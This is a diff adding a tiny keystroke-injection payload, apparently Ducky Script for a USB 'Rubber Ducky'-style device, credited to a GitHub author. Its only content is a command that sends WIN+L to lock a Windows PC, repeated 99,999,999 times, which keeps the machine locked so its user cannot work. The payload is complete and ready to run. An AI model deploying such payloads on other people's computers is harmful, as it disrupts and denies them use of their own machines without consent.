@@ -1,0 +1,4 @@
+REM Author: @unveroleone | https://github.com/veroleone
+REM Does WIN + L (Locks) Pcs the whole time
+GUI l
+REPEAT 99999999
